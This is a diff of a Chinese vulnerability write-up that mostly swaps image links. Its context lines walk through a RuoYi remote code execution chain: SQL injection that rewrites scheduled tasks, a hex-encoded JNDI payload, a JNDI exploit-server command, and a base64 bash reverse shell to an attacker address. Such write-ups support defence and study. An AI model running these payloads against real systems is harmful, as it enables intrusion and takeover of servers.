@@ -46,11 +46,11 @@ schema_version: "1"
   
 在 ruoyi 4.7.5 版本之前，后台接口/tool/gen/createTable处存在 sql 注入(CVE-2022-4566)  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmY0QtoLZD2IDxyCnsbjqHUiaE6Hia18H9X9Ut6ZJDelUmEibT4YxmqZLiaQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/66b56f2bff35512169435f6499730af65128fcec97f36d59a4df8e4767b98f3a.png "")  
   
 找到genTableService的实现类：GenTableServiceImpl，该类同样满足黑白名单条件  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmUO5iciav9a2vrrfeoPemeHQPsnT1DPkjnSfYic5liceBW0mF37Rul1ep5g/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/003302981d0fb834d9e384e8714da79a90fd73685edad905798dd73d2c334c5e.png "")  
   
 对应的 Mapper 语句:  
 ```
@@ -60,7 +60,7 @@ schema_version: "1"
 
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmjBLhF1g3re3v39urfm6BAWhFdL2a7YjLFfXhXeNXV37Xuicfs10aQhw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/6fad68b81e7a6d463a52fce0bc45e0b938fda04a13dd549d03f51cb913cbb807.png "")  
   
 如果 GenTableServiceImpl 是 bean 对象，就可以直接调用 GenTableServiceImpl#createTable 执行 SQL 语句  
   
@@ -77,11 +77,11 @@ for (String beanDefinitionName : beanDefinitionNames) {
 
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmzmuwqWMIlicH4DbZCEGAna8VUibJoP32NbONic9QP2va3rjeAzwkkcSIQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/02532404c65029e064352779b9d76933fdf3e4205c4eaca14b6a72cf3074e4cc.png "")  
   
 ruoyi黑白名单校验仅出现在com.ruoyi.quartz.controller.SysJobController#addSave，而任务状态修改接口中并没有添加，可不调用addSave方法添加计划任务内容，成功绕过黑白名单限制  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmgUy9aAmgebfOG3J3S6QD4p5naVZXrbKm6zRoxDhmgUfYf4riaMDo3xw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/de6a6a8c07d1b040a73c5f117623eba590fe230165de3087a39e607c6c9bc537.png "")  
 ## 计划任务SQL注入   
   
 修改id为1的计划任务的值为’zian’  
@@ -92,9 +92,9 @@ genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 'zian' WHERE
   
 点击启用任务，ID为1的值成功被修改  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmELRS5PGbgSBUquNePiaYFQ6BN6icePUydRql3zfxQWlqhv8YR9NBYUzQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/9a5740ff1abf602602af21635de9ce69f443d1ffd7d2ffc55ce5ae22106cdc8a.png "")  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmCgicYff0JTk6IFHCqLRmpaLG55RVia6PGnL2KutDMpcLn4J14QOkCyJA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/760721f88ebbab24d0325e2c1dd6103d078eb95afcd9be6bfa2ebf3b554da498.png "")  
 ## 利用计划任务执行任意命令   
   
 **验证漏洞**  
@@ -123,7 +123,7 @@ ${jndi://ldap://xxxx.xxx.cn}
 
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmD0NG3mNfrUtBBic9dLQNZIQJ2eg5ryMEPU7fXQeCPqia4TWgrFiaG6rEQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/f4eb0ed9e5bece027ff0c0a78e5a0d8dc9b377557e6206a719e7947c5d91d89a.png "")  
   
 使用 JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar，依赖Java 版本1.8 或者1.7  
 ```
@@ -135,7 +135,7 @@ jar JNDI-Injection-Exploit-Plus-2.3-SNAPSHOT-all.jar -C calc -A 攻击机IP
 
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmmfWShDiaibm8kNq9Dic97KTr3AKTXe4dgCjXYcGVzhMD6c2N7o9HeWeCQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/d375f3c8f2026c79f096c13350cbf6e2bcaf55ba33a17e1d63a2a13483b7335b.png "")  
   
 由于JobInvokeUtil在调用过程中不允许在字符串中使用括号，因此将原始作业表中特定作业的参数值修改为十六进制（绕过防御检测）  
   
@@ -151,13 +151,13 @@ genTableServiceImpl.createTable('UPDATE sys_job SET invoke_target = 0x6A61766178
 
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmCU3IVF9iaCBXCyI0iaH7qQDBTEXgPVWzTyRN2AAr1q6vytnwugHENPicQ/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/47dc27afcb090aacb209a7ed8f5fdf9170f1f5f2794ca6b899f0f05ac4b17557.png "")  
   
 启用任务  
   
 任务3的调用字符串已经是Jndi payload了，后面直接通过/monitor/job/changeStatus接口直接更改任务状态触发Jndi  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmPGHcxC4zCXuIo2GhtvStA6jYcBnzvYicD8hCa5L6opBJdvWHhArVOKA/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/3097fcd5ebb9262c0557c35cafa063ebf8978ff0016398eeb2d94019451ab893.png "")  
 ### 漏洞利用  
   
 **linux反弹shell**  
@@ -176,11 +176,11 @@ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA4Lzc3ODggMD4mMQoKCg==}|
 
 ```  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLmdHUlbwQHbhyeKicuonTJvletia5k7icemKgI8icEuxD5dLO89PhyiaIn1Hw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/4a025ee75aaf7594c86325f3f29d58cc3a2e76090b6ec06df155515a8eca5d39.png "")  
   
 将ldap服务十六进制编码后，通过计划任务id=2执行，这里使用kali 进行监听  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_png/ibZ6uZjjH3v6dYOBHEC2hMHouw41ZnmLm9e6Uc9j1nciaj1S6iavia5zKnk6J3NKvNgHAz2RBAQCjiblJKUCVibicWGMw/640?wx_fmt=png&from=appmsg "")  
+![](../../.resource/remote/5502967bc2232ecc8e8be758830c97350799108b3b3c33d8ec0a29657f1b354d.png "")  
   
 参考文章：  
   
@@ -188,7 +188,7 @@ https://eddiemurphy89.github.io/2024/08/08/Ruoyi-v4-7-8-RCE%E5%88%86%E6%9E%90/
   
 加下方wx，拉你一起进群学习  
   
-![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ibZ6uZjjH3v5KP8CaWoS7GAJnWQQxPpibNdibOdl0hc3X6uuBy7rLVOoxS0OSd4vdHWcibFpZg9T9Bx6T7Rn87RoIw/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
+![](../../.resource/remote/27e4a827007a1d4751a947e8ec438b2f7bced0ee85541c16761a6104e1967648.webp "")  
   
 
 
